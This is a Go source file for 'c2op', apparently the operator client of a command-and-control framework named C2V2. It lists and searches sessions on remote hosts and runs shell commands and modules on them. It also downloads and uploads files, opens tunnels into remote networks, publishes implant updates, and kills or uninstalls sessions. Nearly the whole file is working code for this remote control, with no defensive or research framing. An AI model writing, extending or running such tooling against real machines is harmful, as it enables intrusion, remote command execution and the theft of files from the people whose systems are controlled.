// Command c2op is the operator CLI for C2V2.
package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"sort"
	"strings"
	"time"

	"c2v2/internal/operator"
	"c2v2/internal/protocol"
)

type sessionView struct {
	SID       string   `json:"sid"`
	ClientID  string   `json:"client_id"`
	Host      string   `json:"host"`
	OS        string   `json:"os"`
	Arch      string   `json:"arch"`
	User      string   `json:"user"`
	Transport string   `json:"transport"`
	Tenant    string   `json:"tenant"`
	Online    bool     `json:"online"`
	LastSeen  int64    `json:"last_seen"`
	Caps      []string `json:"caps"`
}

func main() {
	addr := flag.String("addr", envOr("C2V2_OP_ADDR", "wss://127.0.0.1:9448/op"), "operator endpoint (tcp/tls/ws/wss URL)")
	user := flag.String("user", envOr("C2V2_OP_USER", "admin"), "operator name")
	keyB64 := flag.String("key", envOr("C2V2_OP_KEY", ""), "operator key (base64)")
	keyFile := flag.String("key-file", "", "file containing the base64 operator key")
	insecure := flag.Bool("insecure", false, "skip TLS verification (lab only)")
	pin := flag.String("pin", "", "hex SHA256 certificate pin")
	timeout := flag.Duration("timeout", 45*time.Second, "command timeout")
	out := flag.String("o", "", "write result body to file (get)")
	quiet := flag.Bool("q", false, "compact JSON output")
	flag.Usage = usage
	flag.Parse()

	key := *keyB64
	if *keyFile != "" {
		b, err := os.ReadFile(*keyFile)
		if err != nil {
			fail(err)
		}
		key = strings.TrimSpace(string(b))
	}
	keyRaw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(key))
	if err != nil || len(keyRaw) == 0 {
		fail(fmt.Errorf("missing or invalid operator key (use -key/-key-file/C2V2_OP_KEY)"))
	}
	cmd := flag.Arg(0)
	if cmd == "" {
		usage()
		os.Exit(2)
	}
	rawArgs := flag.Args()[1:]
	args, err := operator.ParseKV(rawArgs)
	if err != nil {
		fail(err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), *timeout)
	defer cancel()
	c, err := operator.Dial(ctx, *addr, operator.Options{User: *user, Key: keyRaw, Insecure: *insecure, PinSHA256: *pin, Timeout: 10 * time.Second})
	if err != nil {
		fail(err)
	}
	defer c.Close()

	switch cmd {
	case "search":
		data, err := c.Call(ctx, "list", nil)
		if err != nil {
			fail(err)
		}
		var list []sessionView
		_ = json.Unmarshal(data, &list)
		pat := strings.ToLower(fmt.Sprint(args["host"]))
		if v, ok := args["q"]; ok {
			pat = strings.ToLower(fmt.Sprint(v))
		}
		var hit []sessionView
		for _, s := range list {
			hay := strings.ToLower(s.Host + " " + s.OS + " " + s.User + " " + s.SID + " " + s.ClientID)
			if pat == "" || strings.Contains(hay, pat) {
				hit = append(hit, s)
			}
		}
		printSessions(hit, *quiet)
	case "show":
		sid := fmt.Sprint(args["sid"])
		data, err := c.Call(ctx, "list", nil)
		if err != nil {
			fail(err)
		}
		var list []sessionView
		_ = json.Unmarshal(data, &list)
		for _, s := range list {
			if s.SID == sid || strings.HasPrefix(s.SID, sid) {
				printSessions([]sessionView{s}, *quiet)
				break
			}
		}
		tasks, err := c.Call(ctx, "tasks", map[string]any{"sid": sid, "limit": 20})
		if err == nil {
			printJSON(tasks, *quiet)
		}
	case "options":
		data, err := c.Call(ctx, "module-catalog", nil)
		if err != nil {
			fail(err)
		}
		printJSON(data, *quiet)
	case "list":
		data, err := c.Call(ctx, "list", nil)
		if err != nil {
			fail(err)
		}
		var list []sessionView
		_ = json.Unmarshal(data, &list)
		printSessions(list, *quiet)
	case "put":
		local := fmt.Sprint(args["local"])
		if local == "" || local == "<nil>" {
			fail(fmt.Errorf("put requires --local file"))
		}
		b, err := os.ReadFile(local)
		if err != nil {
			fail(err)
		}
		args["data_b64"] = base64.StdEncoding.EncodeToString(b)
		res, err := c.Call(ctx, "put", args)
		if err != nil {
			fail(err)
		}
		printJSON(res, *quiet)
	case "get":
		res, err := c.Call(ctx, "get", args)
		if err != nil {
			fail(err)
		}
		var rr struct {
			OK   bool `json:"ok"`
			Data struct {
				Path    string `json:"path"`
				Size    int    `json:"size"`
				DataB64 string `json:"data_b64"`
			} `json:"data"`
			Err string `json:"err"`
		}
		_ = json.Unmarshal(res, &rr)
		if !rr.OK {
			fail(fmt.Errorf("get failed: %s", rr.Err))
		}
		b, err := base64.StdEncoding.DecodeString(rr.Data.DataB64)
		if err != nil {
			fail(err)
		}
		if *out != "" {
			if err := os.WriteFile(*out, b, 0600); err != nil {
				fail(err)
			}
			fmt.Printf("wrote %s (%d bytes)\n", *out, len(b))
		} else {
			fmt.Printf("%s", b)
		}
	case "watch":
		tick := args["interval"]
		iv := 5
		if n, ok := tick.(int); ok {
			iv = n
		}
		for {
			data, err := c.Call(ctx, "list", nil)
			if err != nil {
				fail(err)
			}
			var list []sessionView
			_ = json.Unmarshal(data, &list)
			fmt.Printf("--- %s ---\n", time.Now().Format(time.RFC3339))
			printSessions(list, *quiet)
			time.Sleep(time.Duration(iv) * time.Second)
		}
	default:
		data, err := c.Call(ctx, cmd, args)
		if err != nil {
			fail(err)
		}
		printJSON(data, *quiet)
	}
}

func printSessions(list []sessionView, compact bool) {
	if compact {
		printJSON(list, true)
		return
	}
	sort.Slice(list, func(i, j int) bool { return list[i].LastSeen > list[j].LastSeen })
	fmt.Printf("%-18s %-6s %-16s %-10s %-12s %-8s %-6s %s\n", "SID", "ONLINE", "HOST", "OS", "USER", "VIA", "TENANT", "CAPS")
	for _, s := range list {
		caps := ""
		if len(s.Caps) > 0 {
			caps = fmt.Sprintf("%d", len(s.Caps))
		}
		fmt.Printf("%-18s %-6v %-16s %-10s %-12s %-8s %-6s %s\n", s.SID, s.Online, trunc(s.Host, 16), s.OS, trunc(s.User, 12), s.Transport, s.Tenant, caps)
	}
}

func printJSON(v any, compact bool) {
	raw, ok := v.(json.RawMessage)
	if !ok {
		b, err := json.Marshal(v)
		if err != nil {
			return
		}
		raw = b
	}
	if len(raw) == 0 {
		fmt.Println("null")
		return
	}
	var out any
	if err := json.Unmarshal(raw, &out); err != nil {
		fmt.Println(string(raw))
		return
	}
	var b []byte
	if compact {
		b, _ = json.Marshal(out)
	} else {
		b, _ = json.MarshalIndent(out, "", "  ")
	}
	fmt.Println(string(b))
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-1] + "~"
}

func envOr(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func fail(err error) {
	fmt.Fprintln(os.Stderr, "error:", err)
	os.Exit(1)
}

func usage() {
	fmt.Fprintf(os.Stderr, `c2op - C2V2 operator CLI

Usage: c2op [flags] <command> [--key value ...]

Commands:
  list                      list sessions
  search --q TEXT           filter sessions by host/os/user/sid
  show --sid SID            session details + recent tasks
  options                   module catalog
  use --sid SID [--ttl 300] acquire a session lock
  release --sid SID
  run --sid SID --name MODULE [--args JSON]
  shell --sid SID --cmd "whoami"
  ls --sid SID --path /tmp
  cat|get --sid SID --path FILE [-o local]
  put --sid SID --path DEST --local FILE
  rm --sid SID --path FILE
  tasks --sid SID [--limit N]
  audit [--limit N]
  verify-audit
  modules [--sid SID]
  kill --sid SID --confirm KILL [--reason text] [--uninstall]
  update-publish --version v --platform linux --arch x86_64 --url URL --sha256 HEX [--rollout 100]
  update-list | update-push [--version v]
  op-list | op-add --user U --role operator --key-b64 K | op-del --user U
  tunnel-open --sid SID --host 127.0.0.1 --port 80 [--local 18080]
  tunnel-close --tid TID
  presence | stats | whoami | watch

Flags: -addr -user -key -key-file -insecure -pin -timeout -o -q
`)
	_ = protocol.Version
}
